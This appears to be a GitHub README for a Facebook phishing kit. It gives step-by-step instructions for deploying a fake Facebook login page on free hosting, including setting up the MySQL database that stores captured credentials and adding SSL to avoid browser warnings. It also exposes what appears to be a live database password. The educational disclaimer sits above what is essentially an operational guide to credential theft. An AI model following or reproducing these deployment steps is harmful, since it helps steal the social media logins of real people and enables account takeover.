# Facebook-Phishing-in-live-server

<br><br>

Legal Disclaimer :

This Tool is made for educational purposes only. Do not attempt to violate the law with anything contained here. If this is your intention, then Get the hell out of here!

It only demonstrates "how phishing works". You shall not misuse the information to gain unauthorized access to someones social media. However you may try out this at your own risk.

<br><br>

# Summary :

<br>
Use this file you can host a real Facebook phising page

<br><br>

<img src="https://user-images.githubusercontent.com/122178107/211168518-8c464b5f-9bc9-4fb9-aa5c-6b318e91f4cc.png" width=50% height=50%>

<br>

# Step 1 :

```
git clone https://github.com/CyberPlatoon404/Facebook-Phishing-in-live-server.git

One a Account in Profree

Create a subdomain or use custom domain

```

## Steps To Reproduce :

+ Open control panel on register domain and open file manager
+ Upload all above file on htdocs (without a Facebook-Phishing-in-live-server folder)
+ Open control panel click MySQL Databases
+ Create New Database like facebook
+ You can see the details in down of the page
```
    MySQL DB Name 	          MySQL User Name 	  MySQL User Name             Host Name 	
ezyro_33372941_facebook	     ezyro_33372941	   (Your vPanel Password)   	sql223.ezyro.com	`
```
+ the MySQL Password Paasword in home page 
+ Click admin it redirect to PHPMyAdmin page
+ Click import --> Browse your computer: --> (import the facebook.sql) --> Go or Save
+ On control panel open file manager
+ Open htdocs  -> facebook.php -->(right click) Edit

+ In 8th line
```
$con = mysqli_connect ("sql223.ezyro.com","ezyro_33372941","NMBHM8OTaEFZd","ezyro_33372941_facebook");
```

+ Edit the value in 8th line in Brackets
+ First Host Name, MySQL User Name, MySQL User Name, MySQL DB Name 
+ The above values on your MySQL Databases in control panel
+ And Save it
+ If can you add ssl certificate for ignore the warning message





